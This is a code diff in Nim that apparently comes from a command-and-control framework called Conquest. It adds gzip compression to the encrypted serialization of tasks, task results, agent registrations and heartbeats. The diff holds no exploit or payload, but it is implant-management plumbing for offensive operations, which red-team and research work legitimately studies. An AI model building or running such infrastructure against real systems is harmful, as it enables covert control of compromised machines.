@@ -1,4 +1,4 @@
-import strutils, streams, times, tables
+import strutils, streams, times, tables, zippy
 import ../../common/[types, utils, serialize, sequence, crypto]
 
 proc serializeTask*(cq: Conquest, task: var Task): seq[byte] = 
@@ -19,14 +19,17 @@ proc serializeTask*(cq: Conquest, task: var Task): seq[byte] =
     let payload = packer.pack() 
     packer.reset()
 
+    # Compress payload body
+    let compressedPayload = compress(payload, BestCompression, dfGzip)
+
     # Encrypt payload body
-    let (encData, gmac) = encrypt(cq.agents[Uuid.toString(task.header.agentId)].sessionKey, task.header.iv, payload, task.header.seqNr)
+    let (encData, gmac) = encrypt(cq.agents[Uuid.toString(task.header.agentId)].sessionKey, task.header.iv, compressedPayload, task.header.seqNr)
 
     # Set authentication tag (GMAC)
     task.header.gmac = gmac
 
     # Serialize header 
-    let header = packer.serializeHeader(task.header, uint32(payload.len))
+    let header = packer.serializeHeader(task.header, uint32(encData.len))
 
     return header & encData
 
@@ -40,11 +43,14 @@ proc deserializeTaskResult*(cq: Conquest, resultData: seq[byte]): TaskResult =
     validatePacket(header, cast[uint8](MSG_RESULT)) 
 
     # Decrypt payload 
-    let payload = unpacker.getBytes(int(header.size))
-    let decData= validateDecryption(cq.agents[Uuid.toString(header.agentId)].sessionKey, header.iv, payload, header.seqNr, header)
+    let compressedPayload = unpacker.getBytes(int(header.size))
+    let decData = validateDecryption(cq.agents[Uuid.toString(header.agentId)].sessionKey, header.iv, compressedPayload, header.seqNr, header)
+
+    # Decompress payload
+    let payload = uncompress(decData, dfGzip)
 
     # Deserialize decrypted data
-    unpacker = Unpacker.init(Bytes.toString(decData))
+    unpacker = Unpacker.init(Bytes.toString(payload))
 
     let 
         taskId = unpacker.getUint32()
@@ -82,11 +88,14 @@ proc deserializeNewAgent*(cq: Conquest, data: seq[byte]): Agent =
     let sessionKey = deriveSessionKey(cq.keyPair, agentPublicKey)
     
     # Decrypt payload 
-    let payload = unpacker.getBytes(int(header.size)) 
-    let decData= validateDecryption(sessionKey, header.iv, payload, header.seqNr, header)
+    let compressedPayload = unpacker.getBytes(int(header.size)) 
+    let decData = validateDecryption(sessionKey, header.iv, compressedPayload, header.seqNr, header)
+
+    # Decompress payload
+    let payload = uncompress(decData, dfGzip)
 
     # Deserialize decrypted data
-    unpacker = Unpacker.init(Bytes.toString(decData))
+    unpacker = Unpacker.init(Bytes.toString(payload))
 
     let 
         listenerId = unpacker.getUint32()
@@ -128,11 +137,14 @@ proc deserializeHeartbeat*(cq: Conquest, data: seq[byte]): Heartbeat =
     validatePacket(header, cast[uint8](MSG_HEARTBEAT)) 
 
     # Decrypt payload
-    let payload = unpacker.getBytes(int(header.size))
-    let decData= validateDecryption(cq.agents[Uuid.toString(header.agentId)].sessionKey, header.iv, payload, header.seqNr, header)
+    let compressedPayload = unpacker.getBytes(int(header.size))
+    let decData = validateDecryption(cq.agents[Uuid.toString(header.agentId)].sessionKey, header.iv, compressedPayload, header.seqNr, header)
+
+    # Decompress payload 
+    let payload = uncompress(decData, dfGzip)
 
     # Deserialize decrypted data
-    unpacker = Unpacker.init(Bytes.toString(decData))
+    unpacker = Unpacker.init(Bytes.toString(payload))
 
     return Heartbeat(
         header: header,
